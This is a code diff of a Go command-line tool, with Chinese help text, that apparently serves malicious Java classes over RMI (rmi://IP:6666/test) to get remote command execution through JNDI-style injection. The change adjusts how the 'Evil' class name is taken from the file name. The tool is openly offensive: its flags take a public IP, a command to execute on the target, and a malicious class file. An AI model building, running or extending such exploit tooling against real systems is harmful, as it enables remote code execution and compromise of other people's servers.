@@ -7,7 +7,9 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"path/filepath"
 	"strconv"
+	"strings"
 	"test/tools"
 )
 
@@ -138,7 +140,7 @@ func Step2() {
 func main() {
 	flag.StringVar(&IP, "i", "", "-i [公网IP]  一定要是目标机器能访问到的")
 	flag.StringVar(&cmd, "c", "", "-c [执行的命令] 注意，是Runtime.getRuntime().exec执行的，因此会导致某些格式的命令执行不了，特殊命令请自定义class来执行")
-	flag.StringVar(&classfile, "f", "", "-f [class文件名] 可以指定发送恶意类，将需要执行的代码放在static代码块里面即可，对类名和文件名没有要求")
+	flag.StringVar(&classfile, "f", "", "-f [class文件名] 可以指定发送恶意类，将需要执行的代码放在static代码块里面即可，文件名请用 类名.xxx 的形式(xxx为任意字符串)，如:Evil.class")
 	flag.Parse()
 	if IP == "" && (cmd == "" && classfile == "") {
 		fmt.Println("IP 和 命令或class文件名 需要传入， -h 可以查看帮助")
@@ -154,7 +156,9 @@ func main() {
 			fmt.Println("指定的class文件不存在")
 			os.Exit(1111)
 		}
-		classname = tools.Getclassname(classfile)
+		_, fileName := filepath.Split(classfile)
+		classname = strings.Split(fileName, ".")[0]
+		tools.CheckClassname(classfile, classname)
 		tools.Out("控制台", "指定恶意类类名为["+classname+"]", true)
 	}
 	tools.Out("控制台", "请使用 rmi://"+IP+":6666/test 来进行使用", true)
